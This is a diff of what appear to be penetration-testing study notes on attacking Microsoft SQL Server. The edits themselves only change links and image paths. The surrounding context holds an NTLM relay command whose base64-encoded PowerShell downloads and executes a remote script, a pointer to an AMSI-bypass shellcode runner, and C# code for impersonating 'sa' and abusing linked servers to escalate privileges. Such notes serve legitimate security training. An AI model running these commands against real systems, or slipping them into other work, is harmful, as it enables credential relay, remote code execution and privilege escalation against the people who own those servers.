@@ -314,7 +314,7 @@ hashcat.exe -m 5600 hash.txt rockyou.txt
 * Net-NTLM hash (NTLMv2) can't be used for pass-the-hash attack
 * Can be used for relay attacks tho
 
-- Generate [powershell shellcode runner b64 command](../good-exploit-code/osep-good-code.md#powershell-shellcode-runner)
+- Generate [powershell shellcode runner b64 command](../exploitation/amsi-bypass.md#powershell-shellcode-runner)
 - Force SMB request from SQL server --> Relay it to APPSRV01
   * ```bash
     sudo impacket-ntlmrelayx --no-http-server -smb2support -t <Dest IP of the relay> -c 'powershell -enc cG93ZXJzaGVsbCAtYyBJRVggKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJ2h0dHA6Ly8xOTIuMTY4LjQ1LjE5Ny9ydW5hbGwucHMxJyk='
@@ -326,7 +326,7 @@ hashcat.exe -m 5600 hash.txt rockyou.txt
 
 <summary>Privilege Escalation</summary>
 
-* Enumerate which logins allow impersonation ![](<../.gitbook/assets/image (1) (1) (1).png>)
+* Enumerate which logins allow impersonation ![](<../.gitbook/assets/image (1) (1) (1) (1).png>)
   *   ```csharp
       String query = "SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';";
       SqlCommand command = new SqlCommand(query, con);
@@ -342,7 +342,7 @@ hashcat.exe -m 5600 hash.txt rockyou.txt
 
 * Impersonate "sa" using EXECUTE AS LOGIN&#x20;
   * Impersonates a server-level login.
-  * ![](<../.gitbook/assets/image (2) (1) (1).png>)
+  * ![](<../.gitbook/assets/image (2) (1) (1) (1).png>)
   *   ```csharp
       String querylogin = "SELECT SYSTEM_USER;";
       SqlCommand command = new SqlCommand(querylogin, con);
@@ -366,7 +366,7 @@ hashcat.exe -m 5600 hash.txt rockyou.txt
 
 
 * Impersonate using EXECUTE AS USER
-  * Impersonates a database user within a single database. ![](<../.gitbook/assets/image (4) (1) (1).png>)
+  * Impersonates a database user within a single database. ![](<../.gitbook/assets/image (4) (1) (1) (1).png>)
   * ```csharp
     String querylogin = "SELECT USER_NAME();";
     SqlCommand command = new SqlCommand(querylogin, con);
@@ -499,7 +499,7 @@ reader.Close();
 * SQL server links are not bidirectional by default
 * Possible to use a bidirectional link to elevate privileges on the same SQL server
 
-- Finding linked servers on SQL server ![](<../.gitbook/assets/image (5) (1) (1).png>)
+- Finding linked servers on SQL server ![](<../.gitbook/assets/image (5) (1) (1) (1).png>)
   * Eg: APPSRV01 linked to DC01
     *   ```csharp
         String execCmd = "EXEC sp_linkedservers;";
